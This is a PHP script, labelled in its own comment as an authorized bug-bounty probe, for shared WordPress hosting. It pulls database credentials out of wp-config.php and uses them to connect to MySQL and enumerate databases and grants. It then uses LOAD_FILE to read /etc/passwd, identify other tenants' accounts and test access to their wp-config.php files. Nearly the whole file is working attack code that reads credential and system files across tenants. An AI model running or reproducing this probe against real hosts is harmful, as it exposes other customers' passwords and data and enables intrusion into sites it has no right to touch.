<?php
// bugbounty shared-MySQL cross-tenant probe v5 (authorized). Error-visible + defensive.
ini_set('display_errors','1'); error_reporting(E_ALL); header('Content-Type: text/plain');
echo "== shared-MySQL probe v5 ==\n";
$me = function_exists('posix_geteuid') ? @posix_getpwuid(posix_geteuid())['name'] : 'uid'.getmyuid();
echo "me=$me cwd=".getcwd()." php=".phpversion()."\n";
echo "mysqli=".(function_exists('mysqli_connect')?'yes':'NO')." pdo_mysql=".(class_exists('PDO')&&in_array('mysql',PDO::getAvailableDrivers())?'yes':'NO')."\n";

// locate my own wp-config
$cands=array();
$d=getcwd(); for($i=0;$i<4;$i++){ $d=dirname($d); $cands[]="$d/wp-config.php"; }
$cands[]="/home/$me/domains/grey-jaguar-553866.hostingersite.com/public_html/wp-config.php";
$cfg=null; foreach($cands as $c){ if(@is_readable($c)){ $cfg=$c; break; } }
echo "wp-config: ".($cfg?:"NOT FOUND (".implode(" , ",$cands).")")."\n";
if(!$cfg){ echo "== end ==\n"; exit; }
$txt=@file_get_contents($cfg);
function cv($t,$k){ return preg_match('/define\(\s*[\x27"]'.$k.'[\x27"]\s*,\s*[\x27"](.*?)[\x27"]\s*\)/',$t,$m)?$m[1]:null; }
$DB=cv($txt,'DB_NAME'); $US=cv($txt,'DB_USER'); $PW=cv($txt,'DB_PASSWORD'); $HO=cv($txt,'DB_HOST'); if(!$HO)$HO='localhost';
echo "DB_HOST=$HO DB_NAME=$DB DB_USER=$US pw_len=".strlen((string)$PW)."\n\n";
if(!function_exists('mysqli_connect')){ echo "no mysqli; == end ==\n"; exit; }

$c=@mysqli_connect($HO,$US,$PW,$DB);
if(!$c){ echo "connect FAILED: ".mysqli_connect_error()."\n== end ==\n"; exit; }
echo "connected OK\n";
function Q($c,$sql){ $r=@mysqli_query($c,$sql); if($r===false) return "ERR:".mysqli_error($c); $o=array(); while($x=@mysqli_fetch_row($r)) $o[]=implode("|",array_map('strval',$x)); return $o; }
function show($label,$v,$n=30){ echo "-- $label --\n"; echo is_array($v)?("count=".count($v)." : ".implode(", ",array_slice($v,0,$n))."\n"):("$v\n"); }

show("SHOW DATABASES (others?)", Q($c,"SHOW DATABASES"));
show("information_schema.schemata", Q($c,"SELECT schema_name FROM information_schema.schemata"));
show("SHOW GRANTS (FILE priv?)", Q($c,"SHOW GRANTS"), 10);
show("LOAD_FILE('/etc/passwd') length", Q($c,"SELECT LENGTH(LOAD_FILE('/etc/passwd'))"));
$pw=Q($c,"SELECT SUBSTRING_INDEX(LOAD_FILE('/etc/passwd'),CHAR(10),10)");
if(is_array($pw)&&$pw){ $us=array(); foreach(explode("\n",$pw[0]) as $l){ $n=explode(':',$l)[0]; if(preg_match('/^u\d{6,}$/',$n)&&$n!==$me)$us[]=$n; }
  echo "-- OTHER u-users via LOAD_FILE: ".(count($us)?("*** ".implode(",",array_slice($us,0,10))." CROSS-TENANT ***"):"none")." --\n";
  foreach(array_slice($us,0,2) as $ou) show("LOAD_FILE /home/$ou/public_html/wp-config.php len", Q($c,"SELECT LENGTH(LOAD_FILE('/home/$ou/public_html/wp-config.php'))"));
}
show("processlist count/distinct-user", Q($c,"SELECT COUNT(*),COUNT(DISTINCT user) FROM information_schema.processlist"));
echo "== end ==\n";
